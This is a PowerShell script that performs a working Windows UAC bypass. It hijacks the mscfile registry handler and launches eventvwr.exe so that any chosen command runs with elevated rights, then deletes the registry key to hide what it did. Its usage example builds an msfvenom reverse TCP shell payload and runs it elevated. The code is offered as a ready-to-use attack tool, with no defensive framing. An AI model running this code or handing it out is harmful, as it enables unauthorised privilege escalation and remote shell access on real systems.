<#
.SYNOPSIS
UAC Bypass

Author: Blay Abu Safian, Inveteck Global

.PARAMETER Command
Specifies the command you would like to run in high integrity context.

.EXAMPLE
msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=445 -f exe > shell.exe
Invoke-UACBypass -Command "C:\Windows\System32\cmd.exe /c C:\Users\alice\Desktop\shell.exe"

This will effectivly start cmd.exe in high integrity context.

.NOTES
This UAC bypass has been tested on the following:
 - Windows 10.0.14393 N/A Build 14393
#>

function Invoke-UACBypass {
      Param (
      [String]$Command = "C:\Windows\System32\cmd.exe /c start cmd.exe"
      )

      $CommandPath = "HKCU:\Software\Classes\mscfile\shell\open\command"
      $filePath = "HKCU:\Software\Classes\mscfile\shell\open\command"
      New-Item $CommandPath -Force | Out-Null
      New-ItemProperty -Path $CommandPath -Name "DelegateExecute" -Value "" -Force | Out-Null
      Set-ItemProperty -Path $CommandPath -Name "(default)" -Value $Command -Force -ErrorAction SilentlyContinue | Out-Null
      Write-Host "[+] Registry entry created successfully!!!"

      $Process = Start-Process -FilePath "C:\Windows\SysWOW64\eventvwr.exe" -WindowStyle Hidden
      Write-Host "[+] Starting eventvwr.exe"

      Write-Host "[+] Activating payload in 3.."
      Start-Sleep -Seconds 3

      if (Test-Path $filePath) {
      Remove-Item $filePath -Recurse -Force
      Write-Host "[+] Cleaning up registry entry"
      }
}